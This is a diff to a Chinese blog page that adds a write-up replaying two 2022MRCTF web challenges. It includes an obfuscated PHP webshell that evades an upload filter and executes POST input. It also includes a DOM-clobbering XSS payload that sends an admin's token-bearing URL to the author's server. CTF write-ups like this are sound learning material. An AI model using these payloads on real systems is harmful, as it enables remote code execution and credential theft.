@@ -6,7 +6,10 @@
     <meta charset="utf-8">
     <meta name="keywords" content="2022MRCTF复现, Ethe&#39;s blog">
     <meta name="description" content="我太菜了，只能靠看别人的wp来复现过日子了
-">
+WebCheckIn好骚的思路，从来没有想过能这样
+一个只能传php文件的文件上传，但是检测到一些命令执行或者其他的内容就会报错。
+方法一
+ r4kapig的wp里的方式，利用new ERROR(">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -480,21 +483,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-25
+                    2022-04-26
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    19
+                    827
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    3 分
                 </div>
                 
 
@@ -518,6 +521,53 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p>我太菜了，只能靠看别人的wp来复现过日子了</p>
+<h3 id="WebCheckIn"><a href="#WebCheckIn" class="headerlink" title="WebCheckIn"></a>WebCheckIn</h3><p>好骚的思路，从来没有想过能这样</p>
+<p>一个只能传php文件的文件上传，但是检测到一些命令执行或者其他的内容就会报错。</p>
+<p><strong>方法一</strong></p>
+<p> r4kapig的wp里的方式，利用new ERROR(1);来抛出错误</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425215113191.png" alt="image-20220425215113191"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425215120212.png" alt="image-20220425215120212"></p>
+<p>但是事实上这应该是这道题的后端用来过滤上传的php文件里的内容的代码导致的，这个检测感觉有点神奇。利用new一个类之后后边不管是什么都能传上去，只不过只有new一个php的基类时上传的php文件才不会因为报错而导致停止执行。也就是说，这里随便new一个基类就行</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425215459825.png" alt="image-20220425215459825"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425215526239.png" alt="image-20220425215526239"></p>
+<p>然后执行grep命令找flag就行</p>
+<p><strong>方法二</strong></p>
+<p>这是wm的wp里的方法</p>
+<p>一个靠构造CHR以及动态拼接特性构造出的一个很离谱的webshell</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+(((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(.999999999999999).((9.9999999999999999^9)^((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99)))))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(9^((.999999999999999).(.999999999999999))).(.999999999999999)))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(.999999999999999).((9.9999999999999999^9)^((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99)))))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(.999999999999999).((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99))))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(9^9).(.999999999999999)))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(9^9).(9)))))($_POST[1])
+?&gt;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425220952133.png" alt="image-20220425220952133"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425221006937.png" alt="image-20220425221006937"></p>
+<h3 id="God-of-GPA"><a href="#God-of-GPA" class="headerlink" title="God_of_GPA"></a>God_of_GPA</h3><p>先注册个账号，然后登录</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425230157304.png" alt="image-20220425230157304"></p>
+<p>我们可以看到这里有token，这应该是负责认证用户身份的。</p>
+<p>登录之后在查看成绩里有个只有管理员才能看的按钮，而且我们还可以发垃圾话，然后将id提交给管理员让他看。这道题就是让我们利用xss来获取管理员的token来得到flag</p>
+<pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>scrip<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+console.log("injected");
+let uri = window.location.href + "";
+if (uri.indexOf('token') > -1)&#123;
+    location.href="//服务器ip/flag?f="+encodeURIComponent(uri)
+&#125;else&#123;
+ location.href="http://brtserver.node3.mrctf.fun/oauth/authorize?redirect_uri="+window.location.href
+&#125;
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>data:,<span class="token punctuation">"</span>onerror=<span class="token punctuation">"</span>eval(scrip.innerText)<span class="token punctuation">'</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>MyImg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre>
+
+<p>然后我们将uuid提交给管理员</p>
+<p>就可以在服务器的日志里找到管理员的token</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425230709447.png" alt="image-20220425230709447"></p>
+<p>回到login路径下把token换掉就行了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425230756857.png" alt="image-20220425230756857"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425230836819.png" alt="image-20220425230836819"></p>
+<p>这里xss的利用好像主要是Dom Clobbering技术来触发的dom型xss</p>
+<p>（说起来因为dom型xss利用的少，我还是第一次见</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7329">使用 Dom Clobbering 扩展 XSS - 先知社区 (aliyun.com)</a></p>
+<p>附一个出题人写的</p>
+<p><a target="_blank" rel="noopener" href="https://ibukifalling.github.io/2022/04/25/God-of-GPA-WP/">MRCTF2022_God_of_GPA_WP - Welcome to fallingblog (ibukifalling.github.io)</a></p>
+<p>发现好像只有这两个能复现。。。其他的都是Java安全了，放一下y4师傅的java题的wp，以后学会Java之后再看</p>
+<p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/">2022MRCTF-Java部分 | Y4tacker&#39;s Blog</a></p>
 
                 
             </div>
@@ -1023,18 +1073,17 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/04/25/2022MRCTF%E5%A4%8D%E7%8E%B0/">
+                <a href="/2022/04/26/ssrf/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="2022MRCTF复现">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="ssrf">
                         
-                        <span class="card-title">2022MRCTF复现</span>
+                        <span class="card-title">ssrf</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1044,9 +1093,9 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-25
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-04-26
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1055,12 +1104,15 @@
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/ctf/">
-                        <span class="chip bg-color">ctf</span>
+                    <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">web学习</span>
+                    </a>
+                    
+                    <a href="/tags/ssrf/">
+                        <span class="chip bg-color">ssrf</span>
                     </a>
                     
                 </div>
@@ -1309,7 +1361,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">102.3k</span>
+                        class="white-color">112.8k</span>
             
             
             
